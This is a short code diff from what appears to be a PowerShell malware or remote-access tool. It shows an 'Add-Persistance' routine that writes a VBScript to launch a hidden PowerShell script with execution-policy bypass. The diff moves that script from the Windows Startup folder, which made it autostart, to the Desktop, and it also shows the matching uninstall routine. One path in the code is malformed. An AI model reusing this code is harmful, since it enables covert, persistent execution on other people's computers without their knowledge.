@@ -408,14 +408,14 @@ $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""C:\Users\$env:USERPROFILE\Desktop\copy.ps1""", 0, True
 '@
-$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
+$pth = "$env:USERPROFILE\Desktop\service.vbs"
 $tobat | Out-File -FilePath $pth -Force
 Write-Output "Persistance Added."
 rm -path "$env:TEMP\temp.ps1" -Force
 }
 
 Function Remove-Persistance{
-rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
+rm -Path "$env:USERPROFILE\Desktop\service.vbs"
 rm -Path "$env:USERPROFILE\Desktop\copy.ps1"
 Write-Output "Uninstalled."
 }
